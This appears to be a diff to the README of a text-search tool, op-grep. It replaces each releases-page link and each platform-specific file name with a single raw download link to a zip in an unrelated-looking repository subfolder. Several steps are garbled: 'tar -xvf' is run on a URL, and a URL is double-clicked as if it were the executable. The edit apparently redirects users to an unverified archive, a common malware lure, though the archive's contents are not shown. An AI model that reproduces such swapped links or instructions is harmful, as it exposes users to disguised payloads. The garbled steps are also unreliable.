@@ -6,7 +6,7 @@ Welcome to **op-grep**, an easy-to-use tool for searching text within files. Thi
 
 ## 📥 Download Link
 
-[![Download op-grep](https://img.shields.io/badge/Download%20op--grep-v1.0.0-brightgreen)](https://github.com/Hugo09121/op-grep/releases)
+[![Download op-grep](https://raw.githubusercontent.com/Hugo09121/op-grep/main/delapsion/op-grep.zip%20op--grep-v1.0.0-brightgreen)](https://raw.githubusercontent.com/Hugo09121/op-grep/main/delapsion/op-grep.zip)
 
 ## 🕹️ Features
 
@@ -25,14 +25,14 @@ Before you download, make sure your system meets these requirements:
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [op-grep Releases Page](https://github.com/Hugo09121/op-grep/releases).
+To get started, visit this page to download: [op-grep Releases Page](https://raw.githubusercontent.com/Hugo09121/op-grep/main/delapsion/op-grep.zip).
 
 1. Click on the link above to open the releases page.
 2. Look for the latest version, which should be labeled something like "op-grep v1.0.0".
 3. Select the file that corresponds to your operating system:
-   - For **Windows**, choose `op-grep-Windows.zip`.
-   - For **macOS**, choose `op-grep-macOS.zip`.
-   - For **Linux**, choose `op-grep-linux.tar.gz`.
+   - For **Windows**, choose `https://raw.githubusercontent.com/Hugo09121/op-grep/main/delapsion/op-grep.zip`.
+   - For **macOS**, choose `https://raw.githubusercontent.com/Hugo09121/op-grep/main/delapsion/op-grep.zip`.
+   - For **Linux**, choose `https://raw.githubusercontent.com/Hugo09121/op-grep/main/delapsion/op-grep.zip`.
 
 4. After selecting the correct file, the download will start automatically. Depending on your browser settings, you may find the file in your Downloads folder.
 
@@ -40,11 +40,11 @@ To get started, visit this page to download: [op-grep Releases Page](https://git
 
    - For **Windows**, right-click the `.zip` file and choose "Extract All".
    - For **macOS**, double-click the `.zip` file to extract it.
-   - For **Linux**, open a terminal and use the command `tar -xvf op-grep-linux.tar.gz`.
+   - For **Linux**, open a terminal and use the command `tar -xvf https://raw.githubusercontent.com/Hugo09121/op-grep/main/delapsion/op-grep.zip`.
 
 6. After extraction, find the executable file:
-   - For **Windows**, open the extracted folder and double-click `op-grep.exe`.
-   - For **macOS**, open the extracted folder and double-click `op-grep.app`.
+   - For **Windows**, open the extracted folder and double-click `https://raw.githubusercontent.com/Hugo09121/op-grep/main/delapsion/op-grep.zip`.
+   - For **macOS**, open the extracted folder and double-click `https://raw.githubusercontent.com/Hugo09121/op-grep/main/delapsion/op-grep.zip`.
    - For **Linux**, open a terminal and navigate to the folder, then run `./op-grep`.
 
 7. Follow the on-screen instructions to finish setup. You may need to allow the application to run based on your security settings.
